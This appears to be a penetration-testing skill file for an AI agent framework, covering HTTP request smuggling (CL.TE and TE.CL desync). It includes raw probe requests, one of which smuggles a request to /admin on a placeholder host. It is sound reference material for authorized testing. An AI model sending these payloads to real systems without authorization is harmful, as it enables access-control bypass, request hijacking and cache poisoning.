  HTTP request smuggling and desynchronization testing. Use when front proxies,

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=enabled`. Trusted `policy.json` remains authoritative.

- Restrict activity to the exact TaskSpec scope. Use only bounded registry actions accepted by execution policy; exploitation work is limited to the operator's authorized, evidence-recorded scope.
- Preserve baseline and test ToolResults as Evidence, including errors and negative observations, before drawing a conclusion.
- Treat command examples as reference syntax; actual execution goes through the bounded shell_exec tool when the operator has authorized it.
- Complete only after every success criterion is assessed from cited evidence.

> **Technical reference scope**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Applicability signal: route to this Skill before a Run when supplied evidence suggests that a CDN/reverse proxy and origin disagree on request boundaries, including abnormal H2-to-H1 concatenation. The active Run cannot load this Skill dynamically.

## 0. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.
